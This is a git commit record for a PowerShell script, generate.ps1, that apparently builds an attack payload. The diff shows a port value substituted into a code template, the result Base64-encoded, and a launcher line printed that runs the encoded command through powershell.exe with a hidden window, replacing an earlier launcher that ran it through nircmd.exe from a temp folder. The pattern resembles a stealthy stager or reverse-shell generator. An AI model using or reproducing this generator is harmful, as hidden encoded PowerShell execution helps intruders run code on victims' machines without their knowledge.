f73d3d7c7a4f7b09f7568bfc5de5225eed60d03c
11mootie <69021624+11mootie@users.noreply.github.com>
2020-07-31 04:24:17 +0300

    Update generate.ps1

--- generate.ps1
+++ generate.ps1
@@ -71,4 +71,4 @@ $code = $code -replace "PORT_TOKEN", "$port"
 $codebytes = [System.Text.Encoding]::Unicode.GetBytes($code)
 $base64code = [System.Convert]::ToBase64String($codebytes)
 
-Write-Host "C:\Users\%USERNAME%\AppData\Local\Temp\tmpaddonz\nircmd.exe exec hide powershell.exe -NoProfile -WindowStyle hidden -EncodedCommand $base64code"
+Write-Host "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle hidden -EncodedCommand $base64code"
